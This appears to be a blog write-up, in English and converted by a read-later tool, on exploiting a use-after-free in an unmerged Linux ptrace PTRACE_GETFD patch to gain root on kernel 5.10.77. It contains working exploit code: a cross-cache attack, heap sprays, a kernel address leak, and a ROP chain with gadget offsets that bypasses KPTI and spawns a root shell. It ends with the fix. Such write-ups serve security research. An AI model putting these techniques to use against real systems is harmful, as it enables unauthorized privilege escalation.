> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [soez.github.io](https://soez.github.io/posts/no-cve-for-this.-It-has-never-been-in-the-official-kernel/)

> In this blog post, I will demonstrate how I developed an exploit for this bug which was never present......

[javierprtd Blog](https://soez.github.io/)

Introduction
------------

In this blog post, I will demonstrate how I developed an exploit for [this](https://lkml.org/lkml/2019/12/5/814) bug which was never present in the official kernel. The purpose of the exploit is to achieve local privilege escalation in Linux kernel version 5.10.77.

**ptrace** is a system call that allows you to take control of another process. This article introduces the PTRACE_GETFD command to the Linux kernel, which enables retrieving the file descriptor specified by the victim process for tracing purposes.

The bug
-------

```
1 static int ptrace_getfd(struct task_struct *child, unsigned long fd)
2 {
3	struct files_struct *files;
4	struct file *file;
5	int ret = 0;
6
7	files = get_files_struct(child);
8	if (!files)
9		return -ENOENT;
10
11	spin_lock(&files->file_lock);
12	file = fcheck_files(files, fd);
13	if (!file)
14		ret = -EBADF;
15	else
16		get_file(file); // increment f_count
17	spin_unlock(&files->file_lock);
18	put_files_struct(files);
19
20	if (ret)
21		goto out;
22
23	ret = get_unused_fd_flags(0);
24	if (ret >= 0)
25		fd_install(ret, file); // install the reference in file table
26
27	fput(file); // decrement f_count
28 out:
29	return ret;
30 }


```

In line 16, the get_file function increments the f_count (file reference count), which is expected behavior. However, in line 27, the fput function is erroneously decrementing the f_count again, which should not happen. As a result, there is an extra reference installed in the file table, and the f_count remains the same. This leads to two references with f_count = 1. If we close one file descriptor (fd) associated with one of these references, we would have a Use-After-Free (UAF) vulnerability on the other file descriptor reference.

Cache isolated
--------------

In this kernel, the file cache is isolated by the SLAB_ACCOUNT flag

```
380 void __init files_init(void)
381 {
382	filp_cachep = kmem_cache_create("filp", sizeof(struct file), 0,
383			SLAB_HWCACHE_ALIGN | SLAB_PANIC | SLAB_ACCOUNT, NULL);
384	percpu_counter_init(&nr_files, 0, GFP_KERNEL);
385 }


```

This means that we cannot obtain another object from the general-purpose (kmalloc) allocator to allocate over the UAF. So, how do we solve this? The solution is to use a technique called [Cross cache attack](https://veritas501.github.io/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/). In the cross cache attack, we will free the file object that was created and their own page to return to the buddy allocator. After that, we can allocate another object from the general-purpose allocator to exploit the bug.

Cross Cache attack
------------------

To free an object from its slab, we need to free the entire page that contains the object. This involves a series of calls to eventually reach the discard_slab() function. When kmem_cache_free is called, a series of calls are made in the process. These calls are necessary to properly handle the deallocation and manage the slab.

```
kmem_cache_free()
 |
 + slab_free() 
    | 
    + do_slab_free() 
       |
       +__slab_free()
           |
           + put_cpu_partial()
              |
              + unfreeze_partials()
                 |
                 + discard_slab()


```

In [kmem_cache_free](https://elixir.bootlin.com/linux/v5.10.77/source/mm/slub.c#L3160) the function only checks if the object is from their own cache, but the object will be freed. do_slab_free is the wrapper of [slab_free](https://elixir.bootlin.com/linux/v5.10.77/source/mm/slub.c#L3141). In [do_slab_free](https://elixir.bootlin.com/linux/v5.10.77/source/mm/slub.c#L3122) the function checks if the page with their object is from the actual cpu partial active, if this is true, it will adds the object to the freelist, it calls to __slab_free instead.

Before we proceed, please take a moment to familiarize yourself with the organization of the heap in the Linux kernel, specifically the SLUB allocator in Ubuntu. It’s important to understand that different types of objects have their own dedicated cache. For example, an object like a file object (“filp”) is assigned to a specific cache and cannot be placed in another dedicated cache (such as “jar_creds”) or the general-purpose cache (kmalloc). In the SLUB allocator, there are three main types of slab lists: full, partial, and empty lists. In a full list, all slabs have their objects fully allocated, meaning there are no free objects available. In a partial list, slabs contain a mix of allocated and free objects. Some objects within these slabs are still in use, while others have been freed and can be allocated again. In an empty list, all objects within the slabs have been freed, and the slabs are completely empty.

![](https://soez.github.io/assets/images/SLUB.png)

```
struct kmem_cache_node {
	spinlock_t list_lock;

#ifdef CONFIG_SLAB
	struct list_head slabs_partial;	/* partial list first, better asm code */
	struct list_head slabs_full;
	struct list_head slabs_free;
	unsigned long total_slabs;	/* length of all slab lists */
	unsigned long free_slabs;	/* length of free slab list only */
	unsigned long free_objects;
	unsigned int free_limit;
	unsigned int colour_next;	/* Per-node cache coloring */
	struct array_cache *shared;	/* shared per node */
	struct alien_cache **alien;	/* on other nodes */
	unsigned long next_reap;	/* updated without locking */
	int free_touched;		/* updated without locking */
#endif

#ifdef CONFIG_SLUB
	unsigned long nr_partial;
	struct list_head partial;
#ifdef CONFIG_SLUB_DEBUG
	atomic_long_t nr_slabs;
	atomic_long_t total_objects;
	struct list_head full;
#endif
#endif
};


```

```
struct kmem_cache {
	struct kmem_cache_cpu __percpu *cpu_slab;
	/* Used for retrieving partial slabs, etc. */
	slab_flags_t flags;
	unsigned long min_partial;
	unsigned int size;	/* The size of an object including metadata */
	unsigned int object_size;/* The size of an object without metadata */
	struct reciprocal_value reciprocal_size;
	unsigned int offset;	/* Free pointer offset */
#ifdef CONFIG_SLUB_CPU_PARTIAL
	/* Number of per cpu partial objects to keep around */
	unsigned int cpu_partial;
#endif
...
struct kmem_cache_node *node[MAX_NUMNODES];
};


```

```
struct kmem_cache_cpu {
	void **freelist;	/* Pointer to next available object */
	unsigned long tid;	/* Globally unique transaction id */
	struct page *page;	/* The slab from which we are allocating */
#ifdef CONFIG_SLUB_CPU_PARTIAL
	struct page *partial;	/* Partially allocated frozen slabs */
#endif
#ifdef CONFIG_SLUB_STATS
	unsigned stat[NR_SLUB_STAT_ITEMS];
#endif
};


```

###### [__slab_free](https://elixir.bootlin.com/linux/v5.10.77/source/mm/slub.c#L2966)

The kernel will check if the page of the object freed is from active slab or on a partial list. If this condition isn´t met, the function [put_cpu_partial](https://elixir.bootlin.com/linux/v5.10.77/source/mm/slub.c#L2377) is called. Going over, if the object is in a full slab and it is not in active slab, it will call to put_cpu_partial because we need to put the slab in the partial list to be handled. The full slabs are not accounted for. The next step into the function [put_cpu_partial](https://elixir.bootlin.com/linux/v5.10.77/source/mm/slub.c#L2418) the kernel checks if the number of the pobjects (slabs) in the partial list exceeds the limit, wich in this kernel are 13, and think if we are freeing one object from each 14 full slab, no actives, there will be 14 slab to be handled, and the last slab will cause a overflow in the partial list and the slab will be transfered to the node partial list, because of this, the kernel will call to [unfreeze_partials](https://elixir.bootlin.com/linux/v5.10.77/source/mm/slub.c#L2309). Into the function unfreeze_partials the pages (slabs) not empty will be transfered to the node partial list, [discard_slab](https://elixir.bootlin.com/linux/v5.10.77/source/mm/slub.c#L2347) will be called if the page (slab) is empty and not used (new.inuse = 0). See the image offered by this nice [write up](https://ruia-ruia.github.io/2022/08/05/CVE-2022-29582-io-uring/) explaining this.

![](https://soez.github.io/assets/images/freeslab.jpg)

Then, the plan is as follows, after gathering information:

```
$ sudo cat /sys/kernel/slab/filp/object_size
256
$ sudo cat /sys/kernel/slab/filp/objs_per_slab
16
$ sudo cat /sys/kernel/slab/filp/cpu_partial
13


```

*   Alloc (cpu_partial + 1) * objs_per_slab = (13 + 1) * 16
*   Alloc objs_per_slab - 1 = 15
*   Alloc the vulnerable object
*   Alloc objs_per_slab + 1 = 17
*   Get UAF over the vulnerable object (put 3 extra references of their fd with the bug)
*   Free the whole slab of the vulnerable object
*   Free only one object from 14 full slab to cause overflow in the partial list

But, there is a problem :( in this kernel, there isn´t a whole slab with 16 objects in the same page until the slab allocated ~92 ish..

<table><thead><tr><th>Slab</th><th>0</th></tr></thead><tbody><tr><td>stdin</td><td>stdout</td></tr><tr><td>stderr</td><td>object page A</td></tr><tr><td>object page A</td><td>object page A</td></tr><tr><td>object page B</td><td>object page B</td></tr><tr><td>object page C</td><td>object page C</td></tr><tr><td>object page C</td><td>object page A</td></tr><tr><td>object page A</td><td>object page D</td></tr><tr><td>object page D</td><td>object page D</td></tr></tbody></table><table><thead><tr><th>Slab</th><th>~92</th></tr></thead><tbody><tr><td>object page N</td><td>object page N</td></tr><tr><td>object page N</td><td>object page N</td></tr><tr><td>object page N</td><td>object page N</td></tr><tr><td>object page N</td><td>object page N</td></tr><tr><td>object page N</td><td>object page N</td></tr><tr><td>object page N</td><td>object page N</td></tr><tr><td>object page N</td><td>object page N</td></tr><tr><td>object page N</td><td>object page N</td></tr></tbody></table>

Thus, the plan is to use the same scenario but with cpu_partial = 128 (to ensure our success). Remember that the full slabs are not accounted for.

msg_msg objects spray
---------------------

Now, we need to allocate over the previously freed object. What could we use? The syscalls msgsnd and msgrcv are commonly used in various exploits to achieve primitive read/write. The messages can be of multiple size. The [allocation](https://elixir.bootlin.com/linux/v5.10.77/source/ipc/msgutil.c#L53) of these messages is done using kmalloc (general purpose allocator), and it uses the GFP_KERNEL_ACCOUNT flag. By using this method, we can ensure that the previously freed object will be served on one msg_msg object. Please refer to the struct for more details.

```
struct msg_msg {
	struct list_head m_list;
	long m_type;
	size_t m_ts;		/* message text size */
	struct msg_msgseg *next;
	void *security;
	/* the actual message follows immediately */
};


```

We will allocate messages of size 4096 - 48 (the size of the msg_msg struct, excluding the header) + 256 - 8 (the size of the metadata msg_msgseg in the 256 size chunk). Thus, it will allocate chunks of a whole page with their header, and afterwards, it will allocate another chunk of 256 size, and the next pointer in the header will point to it. The first 8 bytes in 256 chunk is also the pointer struct msg_msgseg *next wich it will be NULL. Why this? The file object is the size 256, and if we allocate only the size 256 on msg_msg, it will has their own header, and we will be matching fields in the file object, and we don´t want that.

![](https://soez.github.io/assets/images/msg_msg.png)

Then, to set the correct fields in the freed file object and locate the message, we will populate the following fields. See the struct file:

```
struct file {
	union {
		struct llist_node	fu_llist;
		struct rcu_head 	fu_rcuhead;
	} f_u;
	struct path		f_path;
	struct inode		*f_inode;	/* cached value */
	const struct file_operations	*f_op;

	/*
	 * Protects f_ep_links, f_flags.
	 * Must not be taken from IRQ context.
	 */
	spinlock_t		f_lock;
	enum rw_hint		f_write_hint;
	atomic_long_t		f_count;
	unsigned int 		f_flags;
	fmode_t			f_mode;
	struct mutex		f_pos_lock;
	loff_t			f_pos;
	struct fown_struct	f_owner;
	const struct cred	*f_cred;
	struct file_ra_state	f_ra;

	u64			f_version;
#ifdef CONFIG_SECURITY
	void			*f_security;
#endif
	/* needed for tty driver, and maybe others */
	void			*private_data;

#ifdef CONFIG_EPOLL
	/* Used by fs/eventpoll.c to link all the hooks to this file */
	struct list_head	f_ep_links;
	struct list_head	f_tfile_llink;
#endif /* #ifdef CONFIG_EPOLL */
	struct address_space	*f_mapping;
	errseq_t		f_wb_err;
	errseq_t		f_sb_err; /* for syncfs */
} __randomize_layout
  __attribute__((aligned(4)));	/* lest something weird decides that 2 is OK */


```

See what happens when we do close over the file

```
1278 int filp_close(struct file *filp, fl_owner_t id)
1279 {
1280	int retval = 0;
1281
1282	if (!file_count(filp)) {
1283		printk(KERN_ERR "VFS: Close: file count is 0\n");
1284		return 0;
1285	}
1286
1287	if (filp->f_op->flush)
1288		retval = filp->f_op->flush(filp, id);
1289
1290	if (likely(!(filp->f_mode & FMODE_PATH))) {
1291		dnotify_flush(filp, id);
1292		locks_remove_posix(filp, id);
1293	}
1294	fput(filp);
1295	return retval;
1296 }


```

Only need that f_count > 0, the f_op->flush contains a NULL (flush is at f_op+0x78) and f_mode to be 0x4000.

```
#define FMODE_PATH		((__force fmode_t)0x4000)


```

What address can be f_op? In [the same](https://ruia-ruia.github.io/2022/08/05/CVE-2022-29582-io-uring/) write up, it advices the NULL_MEM 0xfffffe0000002000 address.

Because we don´t want another UAF yet, we will put the f_count = 2, only to locate the chunk and perform another spray afterward. Like so, we will use msgrcv (with the flag MSG_COPY, it will do a copy and the message isn´t deleted) and locate it. If the message is found, it will be deleted, making it available for the next target object in the exploit.

```
int peek_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {

	if (msgrcv(msqid, msgp, msgsz, msgtyp, MSG_COPY | IPC_NOWAIT | MSG_NOERROR) < 0) {
		perror("[-] msgrcv");
		printf("errno: %d\n", errno);
		exit(0);
	}
	
	return 0;
}

int read_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {

	if (msgrcv(msqid, msgp, msgsz, msgtyp, IPC_NOWAIT | MSG_NOERROR) < 0) {
		perror("[-] msgrcv");
		exit(0);
	}
	
	return 0;
}


```

```
char *buf = NULL;
uint32_t uaf = 0;
for (i = 0; i < NUM_MSQIDS; i++) {
	pin_cpu(i % ncpus);
	/* Read de messages of first spray for finding the vulnerable object */
	memset(&message_r, 0, sizeof(message_r));
	if (peek_msg(msqid[i], &message_r, sizeof(message_r.text), 0) < 0) {
		perror("[-] peek_msg");
		exit(0);
	}

	buf = ((char *) &message_r) + PAGE_SIZE - MSG_HEAD_SIZE;
	/* Found message, deleted */
	if (buf[56] != 2) {
		uaf = i;
		printf("[+] Found object at %d\n", uaf);
		memset(&message_r, 0, sizeof(message_r));
		if (read_msg(msqid[uaf], &message_r, sizeof(message_r.text), MTYPE_FIRST) < 0) {
			perror("[-] read_msg");
			exit(0);
		}
		break;
	}
}


```

So, the scenario at the moment is:

*   Cross cache attack
*   Spray msg_msg objects with size 4296 with the before fields mentioned to ensure our success.
*   Close the UAF file (fd_victim)
*   Peek the messages to locate the file and free the msg_msg object

We want a read primitive, but with these objects we can´t achieve it because we don´t control the field size from the object msg_msg.

user_key_payload and timerfd_ctx objects spray
----------------------------------------------

How the [man](https://man7.org/linux/man-pages/man2/add_key.2.html) page says about this syscall:

> add_key() creates or updates a key of the given type and description, instantiates it with the payload of length plen, attaches it to the nominated keyring, and returns the key’s serial number.

See the struct of size 24, we can read/write over data and we can achieve read primitive with this. It is created with kvmalloc with the flag GFP_KERNEL ([add_key](https://elixir.bootlin.com/linux/v5.10.77/source/security/keys/keyctl.c#L116)), but in this kernel we have [aliasing](https://duasynt.com/blog/linux-kernel-heap-feng-shui-2022) in these general purpose objects :)

```
struct user_key_payload {
	struct rcu_head	rcu;		/* RCU destructor */
	unsigned short	datalen;	/* length of this data */
	char		data[] __aligned(__alignof__(u64)); /* actual data */
};


```

Information gathering: This means that only we can alloc 20000 bytes or 200 keys (78 objects ish in this case).

```
noname@ubuntu:~$ sudo cat /proc/sys/kernel/keys/maxbytes 
20000
noname@ubuntu:~$ sudo cat /proc/sys/kernel/keys/maxkeys
200


```

The following scenario is:

*   Spray user_key_payload objects of size 256 - 24 (the first 8 bytes of the data can´t be NULL), this time, the data with f_count = 1, everything else is the same
*   Close de file (over the UAF, fd_victim + 1)
*   Read over the keys to found the UAF key
*   Spray msg_msg again (with the same before size) to match the field datalen with size 1024
*   Free some msg_msg objects close by the UAF to leave space to other spray with objects with interesting metadata (timerfd_ctx objects wich has the same size 256 with the syscall timerfd_create)
*   Spray timerfd_ctx objects
*   Read over the UAF key to leak heap and kernel address

See the following structs

```
struct timerfd_ctx {
	union {
		struct hrtimer tmr;
		struct alarm alarm;
	} t;
	ktime_t tintv;
	ktime_t moffs;
	wait_queue_head_t wqh;
	u64 ticks;
	int clockid;
	short unsigned expired;
	short unsigned settime_flags;	/* to show in fdinfo */
	struct rcu_head rcu;
	struct list_head clist;
	spinlock_t cancel_lock;
	bool might_cancel;
};


```

```
struct hrtimer {
	struct timerqueue_node		node;
	ktime_t				_softexpires;
	enum hrtimer_restart		(*function)(struct hrtimer *);
	struct hrtimer_clock_base	*base;
	u8				state;
	u8				is_rel;
	u8				is_soft;
	u8				is_hard;
};


```

```
static enum hrtimer_restart timerfd_tmrproc(struct hrtimer *htmr)
{
	struct timerfd_ctx *ctx = container_of(htmr, struct timerfd_ctx,
					       t.tmr);
	timerfd_triggered(ctx);
	return HRTIMER_NORESTART;
}


```

```
struct alarm
{
    struct timerqueue_node node; // timerqueue node adding to the event list this value also includes the expiration time.
    struct hrtimer timer; // hrtimer used to schedule events while running
    enum alarmtimer_restart (*function)(struct alarm *, ktime_t now); // Function pointer to be executed when the timer fires.
    enum alarmtimer_type type; // Alarm type (BOOTTIME/REALTIME).
    int state; // Flag that represents if the alarm is set to fire or not.
    void *data; // Internal data value.
};


```

The syscall [timerfd_create](https://elixir.bootlin.com/linux/v5.10.77/source/fs/timerfd.c#L412) will create the struct timerfd_ctx with kzalloc (general purpose) with the flag GFP_KERNEL. The struct timerqueue_node will be empty, and their metadata will point to itself (heap address) and the struct hrtimer has the function pointer timerfd_tmrproc (kernel address), we can leak both.

![](https://soez.github.io/assets/images/leak.png)

The ROP final step
------------------

So far, we have already the leak of the heap (file) and kernel address. Therefore, all that remains is to place the ROP in the file address object and close it to trigger it. So first, there is to leave space to the payload, then we are going to free any object that is occupying the file address, for example, we will free the user_key_payload.

```
/* Free the vulnerable object for leave space to the final payload */
keylen = keyctl(KEYCTL_REVOKE, keys[uaf_key], 0, 0, 0);
if (keylen < 0) {
	perror("[-] keyctl");
	exit(0);
}


```

To success the ROP, we have to bypass the kpti. What is this? This means that the user page table (only has the minimal set kernel page table) and the kernel page table are isolated, and one try to return to the user land from the kernel page table will not have success. How to bypass this? [This](https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/) nice write up shows us how.

> there must be a piece of code in the kernel that will swap the page tables back to the userland ones

What is this code? the function swapgs_restore_regs_and_return_to_usermode + 22 (first mov) which will perform the task.

The ROP chain:

```
uint64_t timerfd_tmrproc = *(uint64_t *) &leak[0x110];
uint64_t kernel_base = timerfd_tmrproc - 0x3db850;
uint64_t chunk = *(uint64_t *) &leak[0x178] - 0x190;

printf("[+] kernel base: 0x%lx\n", kernel_base);
printf("[+] heap payload: 0x%lx\n", chunk);

uint64_t rip = kernel_base + 0xbe00b5;				// push rdi ; .. ; pop rsp ; pop r13 ; pop rbp ; ret
uint64_t add_rsp = kernel_base + 0x1b1f1e;			// add rsp, 0x70 ; pop rbx ; pop r12 ; pop rbp ; ret
uint64_t pop_rdi = kernel_base + 0x5eb4b3;			// pop rdi ; .. ; ret
uint64_t prepare_kernel_cred = kernel_base + 0xf3c30;		// prepare_kernel_creds
uint64_t commit_creds = kernel_base + 0xf39c0;			// commit_creds
uint64_t kpti_trampoline = kernel_base + 0xe00fb0 + 22;		// swapgs_restore_regs_and_return_to_usermode + 22

/* Save registers */
save_state();

/* The final buffer with ROP */
memset(&message_w, 0, sizeof(message_w));
message_w.type = MTYPE_SECOND;
*(uint64_t *) &message_w.text[BEGIN_OBJ + 8] = chunk + 0x400;			// rbp
*(uint64_t *) &message_w.text[BEGIN_OBJ + 16] = add_rsp;			// add rsp, 0x70
*(uint64_t *) &message_w.text[BEGIN_OBJ + 40] = chunk;				// fops
*(uint64_t *) &message_w.text[BEGIN_OBJ + 56] = 1;				// f_count
*(uint64_t *) &message_w.text[BEGIN_OBJ + 120] = rip;				// rip
*(uint64_t *) &message_w.text[BEGIN_OBJ + 136] = 0;				// 
*(uint64_t *) &message_w.text[BEGIN_OBJ + 144] = 0;				// 
*(uint64_t *) &message_w.text[BEGIN_OBJ + 152] = chunk + 0x400;			// rbp
*(uint64_t *) &message_w.text[BEGIN_OBJ + 160] = pop_rdi;			// pop_rdi
*(uint64_t *) &message_w.text[BEGIN_OBJ + 168] = 0;				// arg
*(uint64_t *) &message_w.text[BEGIN_OBJ + 176] = prepare_kernel_cred;		// prepare_kernel_cred
*(uint64_t *) &message_w.text[BEGIN_OBJ + 184] = commit_creds;			// commit_creds
*(uint64_t *) &message_w.text[BEGIN_OBJ + 192] = kpti_trampoline;		// swapgs_restore_regs_and_return_to_usermode + 22
*(uint64_t *) &message_w.text[BEGIN_OBJ + 200] = 0;				// dummy rax
*(uint64_t *) &message_w.text[BEGIN_OBJ + 208] = 0;				// dummy rdi
*(uint64_t *) &message_w.text[BEGIN_OBJ + 216] = (uint64_t) shell;		// shell
*(uint64_t *) &message_w.text[BEGIN_OBJ + 224] = user_cs;			// user_cs
*(uint64_t *) &message_w.text[BEGIN_OBJ + 232] = user_rflags;			// user_rflags
*(uint64_t *) &message_w.text[BEGIN_OBJ + 240] = user_sp & 0xffffffffffffff00;	// user_sp
*(uint64_t *) &message_w.text[BEGIN_OBJ + 248] = user_ss;			// user_ss


```

The last scenario:

*   Free the object user_key_payload to leave space to final payload
*   Spray the last msg_msg objects with the payload
*   Close the file (fd_victim + 2)

##### Demo

[![](https://asciinema.org/a/593386.svg)](https://asciinema.org/a/593386)

##### Full exploit

[https://gist.github.com/soez/fe35c29b042f3ea666550195cf4b68df](https://gist.github.com/soez/fe35c29b042f3ea666550195cf4b68df)

Mitigation
----------

The discussion in the [next](https://lkml.org/lkml/2019/12/5/887) post shows how to patch it, thus the f_count is increased correctly with the extra reference installed.

```
 if (ret >= 0)
    fd_install(ret, file);
  else
    fput(file);


```

References
----------

[https://ruia-ruia.github.io/2022/08/05/CVE-2022-29582-io-uring/](https://ruia-ruia.github.io/2022/08/05/CVE-2022-29582-io-uring/)

[https://veritas501.github.io/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/](https://veritas501.github.io/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/)

[https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/](https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/)

[https://syst3mfailure.io/hotrod/](https://syst3mfailure.io/hotrod/)

[https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/](https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/)